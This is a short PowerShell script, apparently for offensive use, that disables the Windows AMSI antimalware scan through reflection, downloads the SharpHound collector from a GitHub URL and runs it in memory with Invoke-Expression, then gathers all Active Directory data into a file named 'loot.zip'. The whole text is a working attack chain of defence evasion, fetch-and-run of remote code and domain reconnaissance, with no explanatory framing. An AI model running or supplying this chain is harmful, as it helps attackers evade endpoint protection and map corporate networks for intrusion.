$Flags = [System.Reflection.BindingFlags] "NonPublic,Static"
$AmsiUtils = [Ref].Assembly.GetType("System.Management.Automation.AmsiUtils")
$Field = $AmsiUtils.GetField("amsiInitFailed", $Flags)
$Field.SetValue($null, $true)
$sharpHoundCode = Invoke-WebRequest -Uri "https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1" -UseBasicParsing
Invoke-Expression $sharpHoundCode.Content
Invoke-BloodHound -CollectionMethod All -ZipFileName loot.zip
